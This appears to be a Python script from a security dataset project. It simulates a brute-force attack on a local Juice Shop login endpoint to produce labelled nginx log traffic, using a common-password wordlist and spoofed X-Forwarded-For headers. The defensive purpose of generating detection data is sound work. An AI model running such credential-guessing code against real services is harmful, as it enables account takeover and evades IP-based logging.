"""
Brute-force login attack simulator.

Sends many POST requests to /rest/user/login with wrong passwords, then one
correct one, so nginx logs a burst of 401s followed by a 200 from one IP.
Used to generate attack traffic for the labelled dataset.

Only ever run this against your own local Juice Shop container.

Usage:
    python src/attacks/brute_force.py
    python src/attacks/brute_force.py --email admin@juice-sh.op --correct-password admin123
"""
import argparse
import json
import time
from datetime import datetime, timezone

import requests

DEFAULT_TARGET = "http://localhost:8080"
DEFAULT_EMAIL = "admin@juice-sh.op"
# A short built-in wordlist; replace / extend with a real one if you like.
WRONG_PASSWORDS = [
    "123456", "password", "qwerty", "letmein", "admin", "welcome",
    "monkey", "dragon", "football", "iloveyou", "123123", "abc123",
    "111111", "sunshine", "princess", "trustno1",
]


def attempt_login(session: requests.Session, target: str, email: str,
                   password: str, fake_ip: str) -> int:
    """Send one login attempt with a spoofed attacker IP. Returns the status code."""
    resp = session.post(
        f"{target}/rest/user/login",
        json={"email": email, "password": password},
        headers={"X-Forwarded-For": fake_ip},
        timeout=10,
    )
    return resp.status_code


def run_brute_force(target: str, email: str, correct_password: str,
                     fake_ip: str, delay: float, ground_truth_path: str):
    session = requests.Session()
    start_ts = datetime.now(timezone.utc).isoformat()

    print(f"[brute_force] attacking {target}/rest/user/login as {email!r} from {fake_ip}")

    attempts = 0
    for wrong in WRONG_PASSWORDS:
        status = attempt_login(session, target, email, wrong, fake_ip)
        attempts += 1
        print(f"  attempt {attempts}: password={wrong!r} -> status {status}")
        time.sleep(delay)

    # Final attempt with the correct password, so the burst ends in a 200.
    status = attempt_login(session, target, email, correct_password, fake_ip)
    attempts += 1
    print(f"  attempt {attempts}: password={correct_password!r} -> status {status}")

    end_ts = datetime.now(timezone.utc).isoformat()

    record = {
        "attack_type": "brute_force",
        "tool": "src/attacks/brute_force.py",
        "ip": fake_ip,
        "target_endpoint": "/rest/user/login",
        "start_ts": start_ts,
        "end_ts": end_ts,
        "attempts": attempts,
        "email": email,
    }
    with open(ground_truth_path, "a") as f:
        f.write(json.dumps(record) + "\n")
    print(f"[brute_force] done, {attempts} attempts. Logged to {ground_truth_path}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simulate a brute-force login attack.")
    parser.add_argument("--target", default=DEFAULT_TARGET,
                         help="Base URL of the proxied app (default: %(default)s)")
    parser.add_argument("--email", default=DEFAULT_EMAIL,
                         help="Account email to attack (default: %(default)s)")
    parser.add_argument("--correct-password", default="admin123",
                         help="The real password to try last, so one attempt succeeds")
    parser.add_argument("--fake-ip", default="10.0.0.60",
                         help="Spoofed X-Forwarded-For IP for this run (default: %(default)s)")
    parser.add_argument("--delay", type=float, default=0.3,
                         help="Seconds between attempts (default: %(default)s)")
    parser.add_argument("--ground-truth", default="data/ground_truth.jsonl",
                         help="File to append this run's record to (default: %(default)s)")
    args = parser.parse_args()

    run_brute_force(
        target=args.target,
        email=args.email,
        correct_password=args.correct_password,
        fake_ip=args.fake_ip,
        delay=args.delay,
        ground_truth_path=args.ground_truth,
    )